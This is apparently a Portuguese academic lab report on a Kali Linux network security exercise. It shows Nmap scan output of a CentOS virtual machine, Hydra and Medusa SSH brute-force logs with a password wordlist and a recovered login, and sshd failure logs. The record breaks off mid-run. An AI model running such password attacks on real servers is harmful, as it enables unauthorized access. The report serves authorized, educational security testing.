Laboratório de Segurança de Redes com Kali Linux

Sobre o projeto

Projeto acadêmico desenvolvido em ambiente virtualizado e controlado, com o objetivo de aplicar conhecimentos de Segurança da Informação e redes.

Durante o laboratório foram realizadas atividades de reconhecimento e varredura de rede, identificação de portas e serviços e testes de segurança utilizando ferramentas disponíveis no Kali Linux.

Ambiente

- Kali Linux
- CentOS
- VMware Workstation
- Rede TCP/IP

Ferramentas utilizadas

- Nmap
- Hydra
- Medusa

Atividades realizadas

- Reconhecimento do ambiente
- Varredura de rede
- Identificação de portas abertas
- Identificação de serviços
- Testes de segurança em ambiente autorizado
- Registro e documentação dos resultados

Resultados

Os resultados obtidos durante as atividades foram registrados e analisados conforme os requisitos do projeto acadêmico.

Observação

Todos os testes foram realizados em ambiente virtualizado, controlado e autorizado, exclusivamente para fins acadêmicos.

Varredura 1

Starting Nmap 7.70 ( https://nmap.org ) at 2026-03-22 17:43 -03
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Initiating ARP Ping Scan at 17:43
Scanning 192.168.136.130 [1 port]
Completed ARP Ping Scan at 17:43, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:43
Completed Parallel DNS resolution of 1 host. at 17:43, 0.02s elapsed
Initiating SYN Stealth Scan at 17:43
Scanning 192.168.136.130 [1000 ports]
Discovered open port 111/tcp on 192.168.136.130
Discovered open port 80/tcp on 192.168.136.130
Discovered open port 22/tcp on 192.168.136.130
Discovered open port 21/tcp on 192.168.136.130
Completed SYN Stealth Scan at 17:43, 0.07s elapsed (1000 total ports)
Initiating Service scan at 17:43
Scanning 4 services on 192.168.136.130
Completed Service scan at 17:43, 6.14s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.136.130
NSE: Script scanning 192.168.136.130.
Initiating NSE at 17:43
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 17:43, 0.68s elapsed
Initiating NSE at 17:43
Completed NSE at 17:43, 0.01s elapsed
Nmap scan report for 192.168.136.130
Host is up (0.00061s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.136.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 78:3f:f6:97:af:0a:6e:3f:85:d1:e4:82:a9:b9:a4:f7 (RSA)
|   256 7e:4d:42:0c:7e:79:f8:3d:f0:c6:15:f7:30:d3:00:da (ECDSA)
|_  256 9b:1f:2b:55:e0:64:86:1c:46:ad:ea:dd:67:00:20:e8 (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|_  100000  2,3,4        111/udp  rpcbind
MAC Address: 00:0C:29:A4:BE:4D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.017 days (since Sun Mar 22 17:18:26 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.136.130

NSE: Script Post-scanning.
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Initiating NSE at 17:43
Completed NSE at 17:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.294KB)

PI
HUGO MARTINS 
==============================
Parte 2 - arquivo /pi/xhydra.txt
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2026-05-16 06:05:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:12/p:21), ~16 tries per task
[DATA] attacking ssh://192.168.136.130:22/
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[22][ssh] host: 192.168.136.130   login: alemao   password: schalke04
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2026-05-16 06:06:36
<finished>

==============================
Parte 3 - arquivo /pi/medusa.txt
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>


Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process 
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan


==============================
Parte 4 - arquivo /pi/secure.reserva
/var/log/secure-20260517:May 16 07:21:14 centos sshd[4035]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Failed password for root from 192.168.136.128 port 52070 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4086]: Connection closed by 192.168.136.128 port 52070 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Failed password for russo from 192.168.136.128 port 52030 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: Connection closed by 192.168.136.128 port 52030 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Failed password for russo from 192.168.136.128 port 52034 ssh2
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4039]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: Connection closed by 192.168.136.128 port 52034 [preauth]
/var/log/secure-20260517:May 16 07:21:15 centos sshd[4041]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=russo
/var/log/secure-20260517:May 17 10:11:29 centos sshd[4489]: Did not receive identification string from 192.168.136.128 port 52082
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3781]: Failed password for alemao from 192.168.136.128 port 51780 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3802]: Failed password for alemao from 192.168.136.128 port 51798 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3804]: Failed password for alemao from 192.168.136.128 port 51806 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: Failed password for alemao from 192.168.136.128 port 51768 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3766]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: Failed password for alemao from 192.168.136.128 port 51770 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3768]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.136.128  user=alemao
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3809]: Failed password for alemao from 192.168.136.128 port 51810 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3784]: Failed password for alemao from 192.168.136.128 port 51782 ssh2
/var/log/secure-20260517:May 16 07:20:58 centos sshd[3811]: Failed password for alemao from 192.168.136.128 port 51812 ssh2

Medusa

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 12
GENERAL: Total Passwords: 21
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: root (1 of 12, 0 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: fulano (2 of 12, 1 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: beltrano (3 of 12, 2 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: cicrano (4 of 12, 3 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: admin (5 of 12, 4 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 123456789 (2 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 12345678 (3 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: hallo123 (4 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: hallo (5 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 12345 (6 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: passwort (7 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: lol123 (8 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 1234 (9 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 123 (10 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: qwertz (11 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: ficken (12 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 1234567 (13 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: arschloch (14 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 1234567890 (15 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: 1q2w3e4r (16 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: killer (17 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: sommer (18 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: schalke04 (19 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: dennis (20 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: americano (6 of 12, 5 complete) Password: r00t (21 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 123456 (1 of 21 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.136.130 (1 of 1, 0 complete) User: alemao (7 of 12, 6 complete) Password: 123456789 (2 of 21 complete)
